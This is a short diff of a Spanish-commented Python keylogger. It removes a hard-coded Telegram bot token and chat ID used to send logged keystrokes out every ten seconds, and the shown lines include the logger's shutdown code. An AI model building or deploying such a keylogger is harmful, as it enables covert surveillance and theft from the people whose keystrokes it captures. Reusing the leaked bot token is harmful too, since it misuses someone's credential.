@@ -39,8 +39,8 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 
 # ==================== CONFIGURACIÓN ====================
-TOKEN = '7843134567:AAERIl4NSsQNv65avHfWwXqjk1fuC0Me2is'  # Obtener de @BotFather
-CHAT_ID = '5719356323'       # Obtener con @userinfobot
+TOKEN = ''  # Obtener de @BotFather
+CHAT_ID = ''       # Obtener con @userinfobot
 
 # Intervalos (en segundos)
 INTERVALO_REPORTE = 10      # Envío de logs
@@ -305,3 +305,4 @@ if __name__ == "__main__":
     finally:
         logging.info("Keylogger detenido")
         os._exit(0)
+
